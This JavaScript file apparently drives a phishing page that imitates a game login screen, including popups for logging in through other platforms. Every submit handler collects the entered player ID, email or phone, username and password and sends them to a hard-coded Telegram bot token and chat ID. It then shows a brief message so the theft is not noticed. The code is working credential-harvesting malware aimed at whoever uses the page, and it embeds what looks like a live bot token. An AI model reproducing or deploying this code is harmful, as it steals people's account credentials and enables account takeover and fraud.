function sendToTelegram(user, pass, platform = "Default") {
  const message = `${platform} Login\n${user}\nPassword: ${pass}`;
  const token = "7741229374:AAF7RZDHiyUp31GVh5LISuavRzwXGwC8HtQ";
  const chatId = "7462084516";

  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

  fetch(url)
    .then(() => console.log("Sent to Telegram"))
    .catch(() => alert("Failed to send"));
}

function sendDefaultLogin() {
  const uid = document.getElementById("uid").value;
  const pass = document.getElementById("pass").value;
  sendToTelegram("Player ID: " + uid, pass, "Default");
  showHafidMessage();
}

let currentPlatform = "";
function showPopup(platform) {
  currentPlatform = platform;
  document.getElementById("popup-title").textContent = `Login with ${platform}`;
  document.getElementById("popup").classList.remove("hidden");
}

function closePopup() {
  document.getElementById("popup").classList.add("hidden");
}

function submitPopup() {
  const emailOrPhone = document.getElementById("popup-user").value;
  const username = document.getElementById("popup-username").value;
  const pass = document.getElementById("popup-pass").value;
  const userInfo = `Email/Phone: ${emailOrPhone}\nUsername: ${username}`;
  sendToTelegram(userInfo, pass, currentPlatform);
  showHafidMessage();
  closePopup();
}

function showHafidMessage() {
  document.getElementById("hafid-warning").classList.remove("hidden");
  setTimeout(() => {
    document.getElementById("hafid-warning").classList.add("hidden");
  }, 4000);
}
